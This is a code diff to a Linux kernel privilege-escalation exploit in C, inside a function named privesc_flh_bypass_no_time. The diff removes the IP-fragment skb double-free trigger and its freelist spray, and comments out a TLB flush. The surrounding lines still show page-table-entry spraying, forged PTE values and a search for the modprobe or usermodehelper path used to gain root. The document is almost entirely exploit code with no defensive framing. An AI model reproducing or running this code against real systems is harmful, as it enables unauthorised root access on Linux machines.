@@ -313,30 +313,13 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 		alloc_ipv4_udp(1);
 	}
 
-	// allocate and free 1 skb from freelist
-	df_ip_header.ip_id = 0x1337;
-	df_ip_header.ip_len = sizeof(struct ip)*2 + 32768 + 24;
-	df_ip_header.ip_off = ntohs((0 >> 3) | 0x2000);  // wait for other fragments. 8 >> 3 to make it wait or so?
-	trigger_double_free_hdr(32768 + 8, &df_ip_header);
-	
-	// push N skbs to skb freelist
-	for (int i=0; i < CONFIG_SKB_SPRAY_AMOUNT; i++)
-	{
-		PRINTF_VERBOSE("[*] freeing reserved udp packets to mask corrupted packet... (%d/%d)\n", i, CONFIG_SKB_SPRAY_AMOUNT);
-		recv_ipv4_udp(1);
-	}
 
 	// spray-allocate the PTEs from PCP allocator order-0 list
 	printf("[*] spraying %d pte's...\n", CONFIG_PTE_SPRAY_AMOUNT);
 	for (unsigned long long i=0; i < CONFIG_PTE_SPRAY_AMOUNT; i++)
 		*(char*)PTI_TO_VIRT(2, 0, i, 0, 0) = 0x41;
 
-	PRINTF_VERBOSE("[*] double-freeing skb...\n");
 
-	// cause double-free on skb from earlier
-	df_ip_header.ip_id = 0x1337;
-	df_ip_header.ip_len = sizeof(struct ip)*2 + 32768 + 24;
-	df_ip_header.ip_off = ntohs(((32768 + 8) >> 3) | 0x2000);
 	
 	// skb1->len gets overwritten by s->random() in set_freepointer(). need to discard queue with tricks circumventing skb1->len
 	// causes end == offset in ip_frag_queue(). packet will be empty
@@ -431,7 +414,7 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 				for (unsigned short j=0; j < 512; j++)
 					pte_area[512 + j] = (modprobe_iteration_base + 0x1000 * j) | 0x8000000000000867;
 
-				flush_tlb(_pmd_area, 0x400000);
+				//flush_tlb(_pmd_area, 0x400000);
 				
 #if CONFIG_STATIC_USERMODEHELPER
 				pmd_modprobe_addr = memmem(pmd_data_area, 0x200000, CONFIG_STATIC_USERMODEHELPER_PATH, strlen(CONFIG_STATIC_USERMODEHELPER_PATH));
